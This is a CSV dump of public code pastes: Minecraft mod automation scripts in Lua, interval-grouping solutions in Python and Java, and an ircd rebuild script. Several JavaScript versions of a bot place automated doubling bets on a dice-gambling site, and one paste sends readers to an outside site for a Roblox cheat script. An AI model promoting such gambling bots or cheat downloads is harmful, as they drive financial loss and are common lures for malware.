id,title,username,language,date,content
AxRhjUEC,BloodAltar_bot_v3,Arphahat,Lua,Monday 5th of February 2024 12:36:47 AM CDT,"input_slot = 1      -- location in inventory that the turtle uses to grab an item to place
checking_slot = 15  -- locaiton in inventory that the turtle sucks an item to check if it is complete
target_slot = 16    -- location in inventory that the turtle compares an item against to see if it is complete
output_slot = 2     -- location in inventory that the final output is placed
error_slot = 3		-- location in inventory that the final output is placed if output_slot is full of something else

function IsDone()
	local done = false
	if turtle.getItemCount(target_slot) > 0 then -- only compares to target_slot if something in target_slot
		turtle.select(checking_slot)
		turtle.suck()
		if turtle.compareTo(target_slot) then -- compare the new item to the target item
			-- items match, we're done
			turtle.transferTo(output_slot) -- move to final location
			done = true
		else
			-- not done, put it back in and continue
			turtle.drop()			
		end
	else
		turtle.select(output_slot)
		turtle.suck()
		done = true
	end	
	return done	
end

-- main program
turtle.select(input_slot)
if turtle.getItemCount(input_slot) > 0 then
	turtle.drop(1)
	while true do
	 local lamp = rs.AnalogInput(""front"")
	 if lamp == 15 then -- only check when done is triggered
		 if IsDone() then
			turtle.select(input_slot)
			if turtle.getItemCount() == 0 then -- if input_slot is empty, break the loop and end program.
				break
			end
			-- if slot isn't empty, insert the next one
			turtle.drop(1)
		end
	end
end
write(""Input slot is empty.\n"")"
8M7c4ZMS,snowybot 7777,coinwalk,JavaScript,Monday 5th of February 2024 12:31:40 AM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var blast = ((original/240).toFixed(7));
var tens = (blast*10);
var bilance = original;
var sevens = (blast*6.9);
var eights = (blast*7.9);
var nob = (blast*3);
var surigret = blast;
var forky = 0;
var bob = original;
var havot = original;
var telf = original;
var mighty = blast;
var inpoo = parseFloat(surigret);
var idios = (bilance-bob);
var frock = (blast*2);
var vimot = Math.floor(idios/frock);
var freak = freak = Math.floor(vimot/5);
var hectic = ((Math.floor(freak/2))*2);
var mighty = (hectic*blast);
 
function dobet() {
bilance = parseFloat(document.getElementById('pct_balance').value);
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
} 
if (bilance>telf){
telf = parseFloat(bilance);
}
if (((surigret*20)>=bilance)&&(bilance<telf)&&(bilance>bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    inpoo = parseFloat(surigret);
    idios = (bob-bilance);
    vimot = Math.floor(idios/frock);
    freak = freak = Math.floor(vimot/5);
    hectic = ((Math.floor(freak/2))*2);
    mighty = (hectic*blast);
    forky = 0;
    if (mighty<blast){
        mighty = blast;
        }
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*20)>=bilance)&&(bilance<telf)&&(bilance<bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;  
    telf = parseFloat(bilance);
}
if (((surigret*20)>=bilance)&&(bilance>=telf)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;
    telf = parseFloat(bilance);
}
    if (bilance>=(original*7)) {
    console.log(""winner winner chicken dinner"");
    return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
setTimeout(() => dobet(), 1000);
} 
dobet();
"
4pBBeHNf,sovr_python,crowwhite,Python,Sunday 4th of February 2024 11:43:54 PM CDT,"from collections import namedtuple
from operator import attrgetter

Person = namedtuple('Person', ['start', 'end', 'id'])


def find_maximal_groups(people):
    events = []
    for person in people:
        events.append((person.start, 1, person.id))
        events.append((person.end, -1, person.id))
    events.sort()

    max_count = 0
    count = 0
    max_groups = []
    current_group = set()
    flag = False
    last_count = 0
    for time, delta, id in events:
        if delta == 1:
            current_group.add(id)
        else:
            flag = True
            current_group.remove(id)
        count += delta
        if count >= last_count:
            if flag:
                max_groups.append(set(current_group))
            else:
                if len(max_groups) > 0:
                    max_groups[-1] = set(current_group)
                else:
                    max_groups.append(set(current_group))
            flag = False
        last_count = count
    return max_groups


N = int(input())
people = []
for i in range(N):
    bd, bm, by, dd, dm, dy = map(int, input().split())
    birth = by * 10000 + bm * 100 + bd
    death = dy * 10000 + dm * 100 + dd
    if birth + 18 * 10000<min(death, birth + 80 * 10000):
        people.append(Person(birth + 18 * 10000, min(death, birth + 80 * 10000), i + 1))

max_groups = find_maximal_groups(people)
if len(max_groups)>0:
    for group in max_groups:
        print(' '.join(map(str, sorted(group))))
else:
    print(0)
"
gM3TJJ0z,ircd update,kofany,Bash,Sunday 4th of February 2024 11:43:36 PM CDT,"#!/bin/bash

read -p ""Podaj prefix instalacyjny [domyślnie: /home/ircd/ircd]: "" PREFIX
PREFIX=${PREFIX:-/home/ircd/ircd}

cd
pushd $HOME
if [[ -f ircd.conf ]]; then
    echo -e ""Stary plik ircd.conf obecny, usuwam.""
    rm -rf ircd.conf
fi
if [[ -f ircd.motd ]]; then
    echo -e ""Stary plik ircd.motd obecny, usuwam.""
    rm -rf ircd.motd
fi
sleep 1
echo -e ""Kopiuję pliki ircd.conf i ircd.motd""

cp ""${PREFIX}/etc/ircd.motd"" ""$HOME/ircd.motd""
cp ""${PREFIX}/etc/ircd.conf"" ""$HOME/ircd.conf""
sleep 1
if [[ -f ircd.conf ]]; then
    echo -e ""Plik ircd.conf obecy""
else
    echo -e ""Brak pliku ircd.conf w folderze domowym, sprawdź ręcznie""
    exit 1
fi
if [[ -f ircd.motd ]]; then
    echo -e ""Plik ircd.motd obecy""
else
    echo -e ""Brak pliku ircd.motd w folderze domowym, sprawdź ręcznie""
    exit 1
fi

if [[ -d ""${PREFIX}"" ]]; then
    echo -e ""Usuwam stary folder ircd""
    rm -rf ""${PREFIX}""
fi
if [[ -d $HOME/ircwars ]]; then
    echo -e ""Usuwam stary folder ircwars""
    rm -rf $HOME/ircwars
fi
sleep 1
echo -e ""Pobieram ircWars z repo""
git clone https://github.com/kofany/ircwars
sleep 1
pushd $HOME/ircwars/
sleep 1
echo -e ""Wykonuję configure""
./configure --enable-ip6 --prefix=""${PREFIX}""
sleep 5
pushd ""$HOME/ircwars/x86_64-unknown-linux-gnu/""
echo -e ""Wykonuję make all""
sleep 5
make all
echo -e ""Wykonuję make install""
make install

echo -e ""Kopiuję pliki ircd.conf i ircd.motd do ircd/etc""

cp ""$HOME/ircd.motd"" ""${PREFIX}/etc/ircd.motd""
cp ""$HOME/ircd.conf"" ""${PREFIX}/etc/ircd.conf""

pushd ""${PREFIX}/sbin/""
sleep 1
echo -e ""restartuję ircd""
killall -9 ircd
./ircd
"
ubi0hNi5,sovr_java,crowwhite,Java,Sunday 4th of February 2024 11:42:38 PM CDT,"import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.HashSet;
import java.util.List;
import java.util.stream.Collectors;

import static java.lang.Math.min;

public class Main {

    public static ArrayList<HashSet<Long>> find_maximal_groups(ArrayList<long[]> people) {
        int n = people.size();
        if (n == 0) {
            return new ArrayList<>();
        }
        ArrayList<long[]> events = new ArrayList<>();
        for (long[] person : people) {
            events.add(new long[]{person[0], 1, person[2]});
            events.add(new long[]{person[1], -1, person[2]});
        }
        events.sort(Comparator.comparing(a -> a[0]));
        ArrayList<HashSet<Long>> maxGroups = new ArrayList<>();
        HashSet<Long> current = new HashSet<>();
        long count = 0;
        boolean flag = false;
        long last_count = 0;
        for (long[] event : events) {
            long delta = event[1];
            long id = event[2];
            if (delta == 1) {
                current.add(id);
            } else {
                flag = true;
                current.remove(id);
            }
            count += delta;
            if (count >= last_count) {
                if (flag) {
                    maxGroups.add(new HashSet<>(current));
                } else {
                    if (!maxGroups.isEmpty()) {
                        maxGroups.set(maxGroups.size() - 1, new HashSet<>(current));
                    } else {
                        maxGroups.add(new HashSet<>(current));
                    }
                }
                flag = false;
            }
            last_count = count;
        }
        return maxGroups;
    }


    public static void main(String[] args) throws IOException {
        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
        int n = Integer.parseInt(in.readLine());
        ArrayList<long[]> people = new ArrayList<>();
        for (int i = 0; i < n; i++) {
            String[] q = in.readLine().split("" "");
            int bd = Integer.parseInt(q[0]);
            int bm = Integer.parseInt(q[1]);
            int by = Integer.parseInt(q[2]);
            int dd = Integer.parseInt(q[3]);
            int dm = Integer.parseInt(q[4]);
            int dy = Integer.parseInt(q[5]);
            long birth = by * 10000L + bm * 100L + bd;
            long death = dy * 10000L + dm * 100L + dd;
            if (birth + 18 * 10000 < min(death, birth + 80 * 10000)) {
                people.add(new long[]{birth + 18 * 10000, min(death, birth + 80 * 10000), i + 1});
            }
        }
        ArrayList<HashSet<Long>> maxGroups = find_maximal_groups(people);
        if (maxGroups.isEmpty()) {
            System.out.println(0);
        } else {

            for (HashSet<Long> group : maxGroups) {
                if (!group.isEmpty()) {
                    List<String> peoples = group.stream().sorted().map(String::valueOf).collect(Collectors.toList());
                    System.out.println(String.join("" "", peoples));
                }
            }
        }
    }
}"
HPWiF4Q4,Botania Thermalily ReadMe,MarcosKoco,Lua,Sunday 4th of February 2024 11:25:29 PM CDT,"Timer script for the thermalily, after consuming lava it will need a cool down. The computer calculate the cool down timer based on the redstone signal the thermalily will give trough a redstone comparator.


Thermalilly -> Redstone Comparator -> Back of the computer

The computer reads the strength. For ever 1 point of strength it will do times 20 seconds + 1 second to be safe not to reset the counter of the flower.
When the timer expires it will send a signal to the right of the computer.

Right of the computer -> redstone (link(create)) -> redstone link receive mode -> Modular router on redstone pulse mode with activator module (+ bucket and tank to click on (like endertank)) and Fluid module mk1 to place fluid in world (dont forget the fluid transfer upgrade)"
bp4AJYeM,Botania Thermalily,MarcosKoco,Lua,Sunday 4th of February 2024 11:11:16 PM CDT,"local Back = ""back""
local Right = ""right""
local Time = 0
local Start = false

while true do
	
	local Get = redstone.getAnalogInput(Back)
	
	term.clear()
	term.setCursorPos(25,10)
	print(Time)
	
	if Get > 0 and Start == false then
		
		Time = Get * 20 + 1
		Start = true
		
		term.clear()
		term.setCursorPos(25,10)
		print(Time)
		
	elseif Start == true then
		
		term.clear()
		term.setCursorPos(25,10)
		print(Time)
		
		if Time > 0 then
			
			Time = Time - 1
			
			if Time == 0 then
				
				term.clear()
				term.setCursorPos(25,10)
				print(Time)
				
				redstone.setOutput(Right, true)
				sleep(1)
				redstone.setOutput(Right, false)
				Start = false
				
			end
			
		end
		
	end
	
	sleep(1)
	
end

"
3wvCvPjd,Blox Fruits Script Pastebin 2024,Artani,Lua,Sunday 4th of February 2024 10:28:44 PM CDT,"BLOX FRUITS SCRIPT 2024 MOBILE KEYLESS
https://artanisrbx.com/BLOX-FRUITS-SCRIPT-2024/
COPY LINK INTO BROWSER FOR SCRIPT"
ZVcKkqBf,upgrade snowybot,coinwalk,JavaScript,Sunday 4th of February 2024 09:53:56 PM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var blast = ((original/240).toFixed(7));
var tens = (blast*10);
var bilance = original;
var sevens = (blast*6.9);
var eights = (blast*7.9);
var nob = (blast*3);
var surigret = blast;
var forky = 0;
var bob = original;
var havot = original;
var telf = original;
var mighty = blast;
var inpoo = parseFloat(surigret);
var idios = (bilance-bob);
var frock = (blast*2);
var vimot = Math.floor(idios/frock);
var freak = freak = Math.floor(vimot/5);
var hectic = ((Math.floor(freak/2))*2);
var mighty = (hectic*blast);
 
function dobet() {
bilance = parseFloat(document.getElementById('pct_balance').value);
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
} 
if (bilance>telf){
telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance>bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    inpoo = parseFloat(surigret);
    idios = (bob-bilance);
    vimot = Math.floor(idios/frock);
    freak = freak = Math.floor(vimot/5);
    hectic = ((Math.floor(freak/2))*2);
    mighty = (hectic*blast);
    forky = 0;
    if (mighty<blast){
        mighty = blast;
        }
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance<bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance>=telf)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;
    telf = parseFloat(bilance);
}
    if (bilance>=(original*7)) {
    console.log(""winner winner chicken dinner"");
    return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
setTimeout(() => dobet(), 1000);
} 
dobet();
"
r66dybnQ,glitch fixed snowybot 3144,coinwalk,JavaScript,Sunday 4th of February 2024 09:15:36 PM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var blast = ((original/240).toFixed(7));
var tens = (blast*10);
var bilance = original;
var sevens = (blast*6.9);
var eights = (blast*7.9);
var nob = (blast*3);
var surigret = blast;
var forky = 0;
var bob = original;
var havot = original;
var telf = original;
var mighty = blast;
var inpoo = parseFloat(surigret);
var idios = (bilance-bob);
var frock = (blast*2);
var vimot = Math.floor(idios/frock);
var freak = freak = Math.floor(vimot/5);
var hectic = ((Math.floor(freak/2))*2);
var bocker = (hectic*blast);
var bolux = (inpoo-bocker);
var mighty = (bocker+bolux);
 
function dobet() {
bilance = parseFloat(document.getElementById('pct_balance').value);
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
} 
if (bilance>telf){
telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance>bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    inpoo = parseFloat(surigret);
    idios = (bob-bilance);
    vimot = Math.floor(idios/frock);
    freak = freak = Math.floor(vimot/5);
    hectic = ((Math.floor(freak/2))*2);
    bocker = (hectic*blast);
    bolux = (inpoo-bocker);
    mighty = (bocker+bolux);
    forky = 0;
    if (mighty<blast){
        mighty = blast;
        }
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance<bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance>=telf)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;
    telf = parseFloat(bilance);
}
    if (bilance>=(original*7)) {
    console.log(""winner winner chicken dinner"");
    return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
setTimeout(() => dobet(), 1000);
} 
dobet();
"
9Hx2Q2Lr,glitch fixed snowybot 3144,coinwalk,JavaScript,Sunday 4th of February 2024 09:07:20 PM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var blast = ((original/240).toFixed(7));
var tens = (blast*10);
var bilance = original;
var sevens = (blast*6.9);
var eights = (blast*7.9);
var nob = (blast*3);
var surigret = blast;
var forky = 0;
var bob = original;
var havot = original;
var telf = original;
var mighty = blast;
var inpoo = parseFloat(surigret);
var idios = (bilance-bob);
var frock = (blast*2);
var vimot = Math.floor(idios/frock);
var freak = freak = Math.floor(vimot/5);
var hectic = ((Math.floor(freak/2))*2);
var bocker = (hectic*blast);
var bolux = (inpoo-bocker);
var mighty = (bocker+bolux);
 
function dobet() {
bilance = parseFloat(document.getElementById('pct_balance').value);
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
} 
if (bilance>telf){
telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance>bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    inpoo = parseFloat(surigret);
    idios = (bob-bilance);
    vimot = Math.floor(idios/frock);
    freak = freak = Math.floor(vimot/5);
    hectic = ((Math.floor(freak/2))*2);
    bocker = (hectic*blast);
    bolux = (inpoo-bocker);
    mighty = (bocker+bolux);
    forky = 0;
    if (mighty<blast){
        mighty = blast;
        }
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance<bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    mighty = blast;
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance>=telf)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;
    telf = parseFloat(bilance);
}
    if (bilance>=(original*7)) {
    console.log(""winner winner chicken dinner"");
    return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
setTimeout(() => dobet(), 1000);
} 
dobet();
"
